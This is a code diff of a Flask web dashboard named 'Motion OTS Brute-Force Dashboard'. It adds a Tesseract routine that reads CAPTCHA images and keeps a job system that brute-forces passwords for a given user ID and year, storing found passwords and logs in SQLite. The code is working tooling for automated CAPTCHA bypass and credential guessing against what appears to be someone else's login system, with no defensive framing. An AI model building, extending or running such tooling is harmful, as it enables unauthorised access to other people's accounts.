@@ -1,15 +1,6 @@
 #!/usr/bin/env python3
 """
-Motion OTS Brute‑Force Dashboard – Persistent Database Edition
-Author: Potato
-
-- Stores all jobs in SQLite database.
-- If the server restarts, you can see past jobs and their status.
-- Logs are saved persistently.
-- Runs a web UI to start/stop jobs and view history.
-
-Run: python app.py
-Then open http://localhost:5000
+Motion OTS Brute‑Force Dashboard – Single File, Tesseract OCR
 """
 
 import os
@@ -26,25 +17,37 @@ import re
 from datetime import datetime, timedelta
 from PIL import Image
 from io import BytesIO
-import concurrent.futures
 import sqlite3
+import subprocess
 
 from flask import Flask, render_template_string, request, jsonify, g
 
-# ---------- OCR SETUP ----------
+# ---------- OCR SETUP (Tesseract) ----------
 try:
-    import easyocr
-    import cv2
-    import numpy as np
-    reader = easyocr.Reader(['en'], gpu=False)
-    ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=20)
+    import pytesseract
+    # For Render, Tesseract will be installed in /usr/bin/tesseract
+    pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
     OCR_OK = True
 except ImportError:
     OCR_OK = False
-    print("⚠️  easyocr not installed. Please run: pip install easyocr opencv-python-headless")
+    print("⚠️  pytesseract not installed. Run: pip install pytesseract")
     sys.exit(1)
 
-# ---------- DATABASE SETUP ----------
+def solve_captcha_image(img_bytes):
+    """Use Tesseract to read CAPTCHA text."""
+    img = Image.open(BytesIO(img_bytes))
+    # Preprocess: grayscale, contrast, threshold
+    img = img.convert('L')
+    img = img.point(lambda p: 0 if p < 140 else 255, '1')
+    # Use Tesseract
+    custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    text = pytesseract.image_to_string(img, config=custom_config)
+    cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
+    if len(cleaned) >= 4:
+        return cleaned[:6]
+    return None
+
+# ---------- Database & Job Class (same as before) ----------
 DATABASE = 'brute_jobs.db'
 
 def get_db():
@@ -72,7 +75,6 @@ def init_db():
         ''')
         conn.commit()
 
-# ---------- JOB CLASS WITH PERSISTENCE ----------
 class BruteJob:
     def __init__(self, job_id, user_id, year, status='idle', password=None, logs=None):
         self.job_id = job_id
@@ -135,7 +137,7 @@ class BruteJob:
 
     def _run(self):
         try:
-            self._run_bruteforce()
+            asyncio.run(self._async_bruteforce())
         except Exception as e:
             self.log_queue.put(f"❌ Error: {e}")
         finally:
@@ -143,12 +145,7 @@ class BruteJob:
             self.end_time = datetime.now().isoformat()
             self.save_to_db()
 
-    def _run_bruteforce(self):
-        # Run the async function in a new event loop
-        asyncio.run(self._async_bruteforce())
-
     async def _async_bruteforce(self):
-        # This is the same as before but uses self.log_queue and sets password
         log_queue = self.log_queue
         user_id = self.user_id
         year = self.year
@@ -239,7 +236,7 @@ class BruteJob:
                 if resp.status == 200:
                     img_bytes = await resp.read()
                     loop = asyncio.get_running_loop()
-                    captcha = await loop.run_in_executor(ocr_executor, solve_captcha_image, img_bytes)
+                    captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes)
                     if captcha:
                         return captcha
             await asyncio.sleep(0.1)
@@ -285,12 +282,10 @@ class BruteJob:
                 msg = self.log_queue.get_nowait()
                 self.logs.append(msg)
                 new_logs.append(msg)
-                # If success, update password
                 if "SUCCESS" in msg or "Password found" in msg:
                     if "Password =" in msg:
                         self.password = msg.split("Password =")[-1].strip()
                     self.status = 'success'
-                # Save periodically (every 5 new logs)
                 if len(self.logs) % 5 == 0:
                     self.save_to_db()
             except:
@@ -299,11 +294,10 @@ class BruteJob:
             self.save_to_db()
         return new_logs
 
-# ---------- FLASK APP ----------
+# ---------- Flask App ----------
 app = Flask(__name__)
 app.secret_key = 'supersecretkey-change-this'
 
-# Global job cache (loaded from DB on startup)
 jobs = {}
 
 def load_jobs_from_db():
@@ -317,7 +311,6 @@ def load_jobs_from_db():
             jobs[job.job_id] = job
     print(f"📂 Loaded {len(jobs)} jobs from database.")
 
-# ---------- ROUTES ----------
 @app.route('/')
 def index():
     html = '''
@@ -383,15 +376,11 @@ def index():
         </div>
         <div id="logs" class="logs-box">Waiting for logs...</div>
     </div>
-
     <div class="card">
         <h2>📋 Previous Jobs</h2>
-        <div id="jobList" class="job-list">
-            <!-- populated by JS -->
-        </div>
+        <div id="jobList" class="job-list"></div>
     </div>
 </div>
-
 <script>
     let jobId = null;
     let pollInterval = null;
@@ -407,17 +396,14 @@ def index():
         const user_id = document.getElementById('user_id').value.trim();
         const year = document.getElementById('year').value.trim();
         if (!user_id || !year) return alert('Please fill all fields.');
-
         startBtn.disabled = true;
         stopBtn.disabled = false;
         logsDiv.innerHTML = '';
         statusText.innerText = 'Starting...';
         passwordResult.innerText = '';
-
         const formData = new FormData();
         formData.append('user_id', user_id);
         formData.append('year', year);
-
         try {
             const resp = await fetch('/start', { method: 'POST', body: formData });
             const data = await resp.json();
@@ -478,7 +464,6 @@ def index():
                     logsDiv.scrollTop = logsDiv.scrollHeight;
                 });
             }
-
             if (data.status === 'success') {
                 statusText.innerText = '✅ Success!';
                 passwordResult.innerText = `🎉 Password: ${data.password}`;
@@ -530,8 +515,6 @@ def index():
     }
 
     async function viewJob(jid) {
-        // For simplicity, we'll just load the logs into the current view
-        // You can implement a modal or navigation later
         const resp = await fetch(`/status/${jid}`);
         const data = await resp.json();
         if (data.logs) {
@@ -555,8 +538,6 @@ def index():
         if (pollInterval) clearInterval(pollInterval);
         jobId = null;
     }
-
-    // Load jobs on page load
     loadJobs();
 </script>
 </body>
@@ -574,7 +555,6 @@ def start_job():
         year = int(year)
     except:
         return jsonify({'error': 'Year must be integer'}), 400
-
     job_id = str(uuid.uuid4())
     job = BruteJob(job_id, user_id, year)
     jobs[job_id] = job
@@ -605,7 +585,6 @@ def stop_job(job_id):
 
 @app.route('/jobs')
 def list_jobs():
-    # Return all jobs from DB
     with sqlite3.connect(DATABASE) as conn:
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
@@ -623,14 +602,12 @@ def list_jobs():
             })
         return jsonify({'jobs': jobs_list})
 
-# ---------- TEARDOWN ----------
 @app.teardown_appcontext
 def close_connection(exception):
     db = getattr(g, '_database', None)
     if db is not None:
         db.close()
 
-# ---------- MAIN ----------
 if __name__ == '__main__':
     init_db()
     load_jobs_from_db()
